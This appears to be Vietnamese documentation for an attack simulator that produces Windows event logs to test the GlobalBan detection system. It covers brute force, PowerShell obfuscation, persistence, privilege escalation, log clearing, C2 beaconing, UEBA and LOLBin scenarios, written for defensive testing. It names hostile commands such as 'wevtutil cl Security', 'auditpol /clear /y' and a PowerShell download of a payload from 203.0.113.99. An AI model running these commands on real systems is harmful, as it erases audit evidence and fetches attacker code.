# CHI TIẾT 8 KỊCH BẢN TẤN CÔNG, UEBA 7-DAY BASELINE & KIỂM THỬ BÁO ĐỘNG GIẢ

Tài liệu này giải thích chi tiết từng kịch bản tấn công và bộ dữ liệu kiểm thử được xây dựng trong [scenarios.py](file:///c:/Users/PC1/attack-globalban/attack_simulator/scenarios.py) và chấm điểm bởi [evaluator.py](file:///c:/Users/PC1/attack-globalban/attack_simulator/evaluator.py).

---

## 1. Bảng Tổng Hợp 8 Kịch Bản & Bộ Đánh Giá

| STT | Mã kịch bản | Tên kịch bản tấn công | Event ID / Dữ liệu sử dụng | Mã kỹ thuật MITRE ATT&CK | Rule GlobalBan phát hiện |
| :-: | :--- | :--- | :--- | :--- | :--- |
| **1** | `brute_force` | Brute Force & Password Spraying | `4625`, `4771`, `4776` | `T1110`, `T1110.001`, `T1110.003` | `AUTH-FAILURE-BURST` (Level 1 & Level 2) |
| **2** | `obfuscation` | Lệnh mã hóa / Làm rối PowerShell | `4688`, `4104` | `T1059.001`, `T1027.010` | `OBFUSCATED-COMMAND-LINE`, `WINDOWS-4688-4104` |
| **3** | `persistence` | Xâm nhập & Cắm chốt bền vững | `4624` $\rightarrow$ `4688` $\rightarrow$ `4698` / `7045` | `T1053.005`, `T1543.003` | `WINDOWS-4624-4688-4698`, `WINDOWS-4624-4688-7045` |
| **4** | `privilege_escalation` | Leo thang đặc quyền tài khoản | `4720` $\rightarrow$ `4728`/`4732`/`4756` $\rightarrow$ `4704` | `T1098`, `T1134` | `PRIVILEGE-CHANGE`, `WINDOWS-4720-4732-4704` |
| **5** | `defense_evasion` | Xóa dấu vết & Vô hiệu hóa Audit | `7045` / `4688` $\rightarrow$ `1102` / `4719` | `T1070.001`, `T1562.002`, `T1543.003` | `WINDOWS-7045-1102`, `WINDOWS-4688-1102`, `WINDOWS-7045-4719` |
| **6** | `c2_beaconing` | Kết nối điều khiển định kỳ (C2) | `5156` (`Direction=%%14592`) | `T1071.001` | `C2-BEACONING` |
| **7** | `ueba_7days` | UEBA Lệch chuẩn Thói quen & Atomic Red Team | `4624`, `4634`, `4688`, `5156`, `4104`, Sysmon `1`, `3` | `T1078`, `T1059.001`, `T1033`, `T1105`, `T1071.001`, `T1053.005` | `UEBA-BEHAVIOR-DEVIATION` |
| **8** | `winlolbin_gt` | Lạm dụng công cụ hệ thống (LOLBins) | `4688` (WinLOLBIN-GT CSV) | `T1218`, `T1218.005`, `T1218.010`, `T1218.011`, ... (44 kỹ thuật) | `LOLBIN-ABUSE` |

---

## 2. Phân Tích Chuyên Sâu Từng Kịch Bản

### Kịch bản 1: Brute Force / Password Spraying (`brute_force`)
- **Hành vi kẻ tấn công**: Kẻ tấn công từ một địa chỉ IP bên ngoài thử dò mật khẩu liên tục lên dịch vụ đăng nhập Windows (`EventID 4625` - NTLM/Logon fail, `4771` - Kerberos Pre-auth fail, `4776` - Domain Controller NTLM validation fail).
- **Cách công cụ Red Team giả lập**:
  - **Chế độ Password Spraying (`T1110.003`)**: Thử mật khẩu trên nhiều tài khoản khác nhau (`admin`, `administrator`, `svc_sql`, `backup`, `helpdesk`) từ cùng 1 IP trong vòng 15 giây. Ngay tại lần thất bại thứ 5 ($\ge 5$ lỗi và $\ge 2$ tài khoản khác nhau), GlobalBan kích hoạt cảnh báo **`AUTH-FAILURE-BURST` (Level 2 - Mức nguy hiểm cao)**.
  - **Chế độ Brute Force 1 tài khoản chuyển sang nhiều tài khoản (`T1110.001`)**: 5 lần đầu dò mật khẩu tài khoản `administrator` $\rightarrow$ kích hoạt **`AUTH-FAILURE-BURST` (Level 1)**; lần thứ 6 chuyển sang dò tài khoản `svc_domain_admin` $\rightarrow$ tự động nâng cấp lên **Level 2**.

### Kịch bản 2: Lệnh mã hóa / Làm rối (`obfuscation`)
- **Hành vi kẻ tấn công**: Kẻ tấn công chạy PowerShell với tham số ẩn cửa sổ (`-w hidden`, `-nop`) kèm chuỗi lệnh mã hóa Base64 (`-EncodedCommand`, `-enc`) hoặc giải mã trên bộ nhớ (`FromBase64String`, `IEX`, `Invoke-Expression`) nhằm qua mặt phần mềm diệt virus truyền thống.
- **Cách công cụ Red Team giả lập**:
  - Sinh sự kiện `EventID 4688` (Tạo tiến trình mới) với `CommandLine` chứa payload mã hóa $\rightarrow$ kích hoạt ngay **`OBFUSCATED-COMMAND-LINE`** (`T1059.001`).
  - Sinh thêm sự kiện `EventID 4104` (PowerShell ScriptBlock Logging) trên cùng máy chủ ngay sau đó 2 giây $\rightarrow$ bộ phát hiện chuỗi `WindowsSequenceDetector` bắt được cặp tương quan **`WINDOWS-4688-4104`** (`T1027.010`).

### Kịch bản 3: Xâm nhập & Cắm chốt (`persistence`)
- **Hành vi kẻ tấn công**: Sau khi đăng nhập thành công vào máy nạn nhân, kẻ tấn công khởi chạy công cụ hệ thống (`schtasks.exe` hoặc `sc.exe`) để tạo tác vụ chạy ngầm định kỳ (Scheduled Task) hoặc cài đặt dịch vụ độc hại (Windows Service) nhằm duy trì quyền truy cập lâu dài.
- **Cách công cụ Red Team giả lập**:
  - Sinh chuỗi 3 sự kiện liên tiếp trên cùng 1 máy tính (`Computer`) trong cửa sổ 300 giây:
    1. `EventID 4624`: Đăng nhập thành công từ IP ngoại vi (*Sự kiện tiền đề - Precursor*).
    2. `EventID 4688`: Khởi tạo tiến trình `schtasks.exe /create ...` hoặc `sc.exe create ...` $\rightarrow$ kích hoạt **`WINDOWS-4624-4688`**.
    3. `EventID 4698` (Tạo Scheduled Task) hoặc `EventID 7045` (Cài đặt Service mới) $\rightarrow$ kích hoạt **`WINDOWS-4624-4688-4698`** (`T1053.005`) hoặc **`WINDOWS-4624-4688-7045`** (`T1543.003`) kèm nhãn tương quan `logon, process creation, and persistence events correlated`.

### Kịch bản 4: Leo thang đặc quyền (`privilege_escalation`)
- **Hành vi kẻ tấn công**: Tạo tài khoản hậu môn mới, thêm tài khoản đó vào nhóm quản trị viên cao nhất (`Administrators`) và gán trực tiếp quyền đặc biệt của hệ thống (`User Right Assignment`).
- **Cách công cụ Red Team giả lập**:
  - Sinh chuỗi 3 bước trên Domain Controller:
    1. `EventID 4720`: Tạo người dùng mới `svc_support_XX` (*Precursor*).
    2. `EventID 4732` (hoặc `4728` / `4756`): Thêm vào nhóm `Administrators` $\rightarrow$ kích hoạt đồng thời 2 bộ phát hiện: **`PRIVILEGE-CHANGE`** và **`WINDOWS-4720-4732`** (`T1098`).
    3. `EventID 4704`: Gán quyền đặc biệt cho tài khoản mới $\rightarrow$ kích hoạt **`PRIVILEGE-CHANGE`** và **`WINDOWS-4720-4732-4704`** (`T1134`).

### Kịch bản 5: Xóa dấu vết & Vô hiệu hóa Giám sát (`defense_evasion`)
- **Hành vi kẻ tấn công**: Sau khi cài cắm mã độc hoặc thực thi lệnh, kẻ tấn công chạy `wevtutil cl Security` để xóa sạch nhật ký bảo mật hoặc chạy `auditpol /clear /y` để tắt chức năng ghi log của Windows.
- **Cách công cụ Red Team giả lập**:
  - Bước 1: `EventID 7045` (Cài dịch vụ lạ) hoặc `EventID 4688` (Chạy `wevtutil.exe`).
  - Bước 2: `EventID 1102` (Security Audit Log đã bị xóa) hoặc `EventID 4719` (System Audit Policy bị thay đổi) $\rightarrow$ kích hoạt **`WINDOWS-7045-1102`**, **`WINDOWS-4688-1102`**, **`WINDOWS-7045-4719`**, **`WINDOWS-4688-4719`** (`T1070.001`, `T1562.002`).

### Kịch bản 6: Kết nối máy chủ điều khiển định kỳ (`c2_beaconing`)
- **Hành vi kẻ tấn công**: Mã độc (Beacon / Implant) nằm vùng trên máy nạn nhân tự động gửi gói tin "điểm danh" (heartbeat) ra một địa chỉ IP Public cố định theo chu kỳ đều đặn (ví dụ: mỗi 30 giây một lần, độ lệch jitter $< 20\%$) để chờ lệnh từ hacker.
- **Cách công cụ Red Team giả lập**:
  - Sinh chuỗi 5 sự kiện `EventID 5156` (Windows Filtering Platform cho phép kết nối mạng) với chiều đi ra (`Direction=%%14592`), đích đến là IP Public thực tế, cách nhau ~30 giây ($\pm 1$ giây jitter).
  - Tại kết nối thứ 5, bộ phát hiện `C2BeaconDetector` tính toán độ lệch chuẩn khoảng cách thời gian và kích hoạt **`C2-BEACONING`** (`T1071.001`).

---

## 3. Kịch Bản 7: UEBA Behavioral Profiling (Học 7 Ngày Thói Quen & Phát Hiện Atomic Red Team)

Đây là tính năng nâng cao giúp GlobalBan phát hiện **các cuộc tấn công sử dụng tài khoản hợp lệ (*Valid Accounts*) hoặc các lệnh không bị bắt bởi chữ ký tĩnh**:

### Giai đoạn 1: Học thói quen 7 ngày (`output/windows_baseline_7days.xml`)
Công cụ sinh **1,078 sự kiện** trải đều trong 7 ngày làm việc cho 3 hồ sơ:
1. **`nguyen.an` trên máy `PC-01`**: Nhân viên văn phòng, làm việc từ `08:00–17:00`, chỉ dùng `WINWORD.EXE`, `EXCEL.EXE`, `chrome.exe`, `explorer.exe`, kết nối nội bộ `10.10.1.10:445`, `10.10.1.53:53` và web `198.51.100.10:443`. Không bao giờ dùng PowerShell.
2. **`tran.binh` trên máy `PC-02`**: Nhân viên kế toán, làm việc từ `08:00–17:00`, chỉ dùng `EXCEL.EXE`, `WINWORD.EXE`, `msedge.exe`, `OUTLOOK.EXE`.
3. **`admin.it` trên máy chủ `SRV-FILE01`**: Quản trị viên hệ thống, làm việc từ `09:00–16:00`, thường xuyên chạy PowerShell với lệnh lành tính `Get-Service`, `Get-ChildItem`.

### Giai đoạn 2: Kiểm thử 8 đòn tấn công Atomic Red Team (`output/windows_test_atomic.xml`)
Khi đưa bộ log kiểm thử vào `ProfileAnomalyDetector` (`rule_id="UEBA-BEHAVIOR-DEVIATION"`), GlobalBan bỏ qua hoàn toàn 10 hoạt động làm việc bình thường trong ngày (TN = 10, FP = 0) và bắt chính xác cả **8 sự kiện bất thường (TP = 8, Recall = 100%)**:

1. **`test-009` (`T1078`)**: `nguyen.an` đăng nhập vào `PC-01` lúc **02:01 sáng** $\rightarrow$ Bắt lỗi `unusual_login_hour`, `unusual_machine_activity_hour`.
2. **`test-010` (`T1059.001`)**: `nguyen.an` khởi chạy `powershell.exe` lúc **02:02 sáng** trên `PC-01` $\rightarrow$ Bắt lỗi `unusual_user_activity_hour`, `unusual_process_for_user`, `unusual_process_for_machine`.
3. **`test-011` (`T1033`)**: `nguyen.an` chạy lệnh dò tìm quyền `whoami /all` trong PowerShell $\rightarrow$ Bắt lỗi `unusual_powershell_command`.
4. **`test-012` (`T1105`)**: `nguyen.an` tải file độc hại `Invoke-WebRequest -Uri https://203.0.113.99/payload.bin` $\rightarrow$ Bắt lỗi `unusual_powershell_command`, `download_or_transfer_marker`.
5. **`test-013` (`T1071.001`)**: `powershell.exe` trên `PC-01` kết nối ra IP/Port lạ `203.0.113.99:8443` $\rightarrow$ Bắt lỗi `unusual_network_connection`.
6. **`test-014` (`T1078`)**: `nguyen.an` đăng nhập mạng vào máy chủ `SRV-FILE01` lúc 10:15 sáng $\rightarrow$ Bắt lỗi `unusual_machine_for_user`, `unusual_user_for_machine` (Di chuyển ngang).
7. **`test-015` (`T1059.001`)**: `tran.binh` trên `PC-02` có tiến trình `WINWORD.EXE` đẻ ra `powershell.exe -EncodedCommand ...` $\rightarrow$ Bắt lỗi `unusual_process_for_user`, `unusual_process_for_machine`, `unusual_powershell_command`, `encoded_or_obfuscated_script_marker`.
8. **`test-016` (`T1053.005`)**: `tran.binh` trên `PC-02` chạy `schtasks.exe /create /tn "AtomicUpdater"` để cắm chốt $\rightarrow$ Bắt lỗi `unusual_process_for_user`, `unusual_process_for_machine`.

---

## 4. Cơ Chế Kiểm Thử Chống Báo Động Giả (Benign & Admin Noise)

Để chứng minh hệ thống không báo động nhầm, công cụ sinh thêm 2 lớp dữ liệu sạch:
1. **Log hoạt động bình thường (`generate_benign_events`)**:
   - Đăng nhập máy trạm thông thường (`4624`), kết nối mạng nội bộ RFC1918 (`10.x.x.x`), kết nối chiều vào máy chủ Web (`Direction=%%14593`), gõ sai mật khẩu 1 lần duy nhất (`4625` rời rạc $< 5$ lần), mở Chrome/Notepad/Explorer.
2. **Nhiễu Quản trị viên hợp lệ (`generate_ambiguous_admin_noise`)**:
   - Giả lập các thao tác của SysAdmin rất dễ gây nhầm lẫn cho các hệ thống SIEM thông thường:
     - Chạy `whoami.exe /groups`, `ipconfig.exe /all`, `certutil.exe -store my`, `bitsadmin.exe /list`, `wmic.exe logicaldisk`, `schtasks.exe /query`, `reg.exe query`.
     - Đăng nhập đặc quyền `4672` nhưng không có chuỗi hành vi leo thang đi kèm.
     - Bộ phận IT Helpdesk tạo tài khoản nhân viên mới (`4720`) đơn lẻ mà không gán vào nhóm Admin.
   - **Kết quả**: Nhờ bộ lọc ngữ cảnh thông minh của GlobalBan, toàn bộ các sự kiện này đều được nhận diện đúng là lành tính (**False Positive = 0, FPR = 0.00%**).
